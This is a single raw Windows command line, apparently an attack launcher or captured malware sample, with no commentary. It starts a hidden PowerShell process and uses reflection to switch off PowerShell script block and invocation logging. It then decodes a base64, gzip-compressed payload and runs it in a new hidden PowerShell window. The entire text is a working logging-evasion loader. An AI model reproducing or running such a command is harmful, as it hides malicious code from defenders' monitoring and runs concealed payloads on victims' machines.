C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c " if ([System.IntPtr]::Size -eq 4) {     $psPath = Join-Path $env:windir 'sysnative\WindowsPowerShell\v1.0\powershell.exe' } else {     $psPath = 'powershell.exe' } $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo $processStartInfo.FileName = $psPath $processStartInfo.Arguments = '-noni -nop -w hidden -c ' $logKey = 'Sc' + 'riptB' + 'lockLogging' if ($PSVersionTable.PSVersion.Major -ge 3) {     $enableLogging = 'EnableScriptBlockLogging'     $props = [Collections.Generic.Dictionary[string,System.Object]]::new()     $invocLog = 'EnableScriptBlockInvocationLogging'     $type1 = [Ref].Assembly.GetType('System.Management.Automation.Utils')     $type2 = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')     if ($type2) {         $field = $type2.GetField('hasLogged', 'NonPublic,Static')         if ($field) {             $field.SetValue($null, $true)         }     }     $groupPolicySettings = $type1.GetField('cachedGroupPolicySettings', 'NonPublic,Static')     if ($groupPolicySettings) {         $policies = $groupPolicySettings.GetValue($null)         if ($policies[$logKey]) {             $policies[$logKey][$enableLogging] = 0             $policies[$logKey][$invocLog] = 0         }         $props.Add($invocLog, 0)         $props.Add($enableLogging, 0)         $policies['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $logKey] = $props     } } else {     $legacyType = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')     $legacyField = $legacyType.GetField('signatures', 'NonPublic,Static')     $legacyField.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]')) } $decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('H4sIAJaRNWUA/7WW+27bNhTG/9dTsIIG2SioWfRN8lAgcBINHtw0s5OumGcEtiInKmQpkOR5QZZ377nQbWZx6wZ08u0TP5KH/JGHsrPb6xdc+LXfiTfi5MkScLkdF27cU/cH4fokRygVyd9Qdkleo+yRrFD2SSYoByRLlEOSK5QByVuUIcktheBwKWmOl5PmgFPSHLEgzSFj0hwzI81B35LmqDVpDrshzXHf0Xw47hlpjktjVxz3PWmOOyPNce9c69ly8m2+hXdOv9scDLsjfalkV/ZkXw7kUAYyhHsfirHch3dX+mj6fbwfSH+I934g/ZB0B5oqqTpS+VBLgexKZVtONsmySZrBF14QSn4s0ly0GoOQ1UOW1sKVrvhTREV5vorv5bv1xySuxZMwrPnCdm7spXhuWxa5++MdMeh7XtgRr0U49DxfKVC9wPP6Q1OAxecAup/9buncCKB1GCV9iNbJExS/nFiGE7OBRSCBWAgoABsQAxaIB1D2gClQU/gDEIlZgD5VhUaAF8qpPVQBHygPkScjDqEhVKU7WCbwO7BOaNkHcrYE3EeDXUA6LHHh72ETNE2fTdxpTVOx+WA0u2xi6jTNHpuYeE2zz+b3RnPAJqZH0xyyiXnUNAM2d66BQcgeJpqBgSaEmW1wNSLP7GpGHbOrIe3NrqaEaWtwNaa12dWc/mZVNaiViQUcKP+wrHDEkItnm2FHaFR3Zlej6pldjaprdjUq3+xqVObdpjSqDUwX054PmOP8NJ0px13pA8WyNrs8rtMCeml917b4weLMoe/F/LGqk613lfxRe+d5XNym+d1yNLq+igLvx6Se1yUUtA7VTov896SsoUJUFtvxqkoGPV3FqeIyfahH1+02d/8Wum+5l4X72q1qVxfiufLtYn6tp/FjnVQw48OQTiH6K2ezyqqECrj04puOyZ3/0ldrVWfT9z9lcXd28euHWbFWP79x9Sgm5x+EDUFPxjY8uyxnfva/rMMUwjnRFBcZ2svT+zS7nUBbIS9X9T2s/pmQUZolQs6SeFcCEard3FYMKbqEjpwbL9pl2cVqy/yccfQvxs6rAD3oVRi/3HhfZnJV/HUe40jX/+oy/wc44zluBsRO6YQvfoobGWmUR4/8I2ybokyAF/wDwLykC2qKzymrY7Q1SSqjSpANLxp8IftsWZ8AOCorKRIKAAA=')) $scriptBlock = [scriptblock]::create($decodedScript) $processStartInfo.Arguments += $scriptBlock.ToString() Write-Output $processStartInfo $processStartInfo.UseShellExecute = $false $processStartInfo.RedirectStandardOutput = $true $processStartInfo.WindowStyle = 'Hidden' $processStartInfo.CreateNoWindow = $true $process = [System.Diagnostics.Process]::Start($processStartInfo) " 